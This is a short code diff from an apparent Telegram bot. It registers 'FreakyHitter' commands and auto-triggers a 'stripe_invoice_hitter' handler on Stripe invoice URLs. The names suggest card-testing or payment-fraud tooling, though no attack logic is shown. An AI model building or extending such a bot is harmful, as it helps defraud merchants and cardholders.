+        print("✅ FreakyHitter commands registered")
+    except Exception as _fk_err:
+        print(f"⚠️ FreakyHitter commands failed to register: {_fk_err}")
     # Only auto-trigger invoice hitter on invoice.stripe.com URLs (not checkout URLs)
     application.add_handler(MessageHandler(filters.Regex(r'(https?://invoice\.stripe\.com/\S+)'), stripe_invoice_hitter))
     
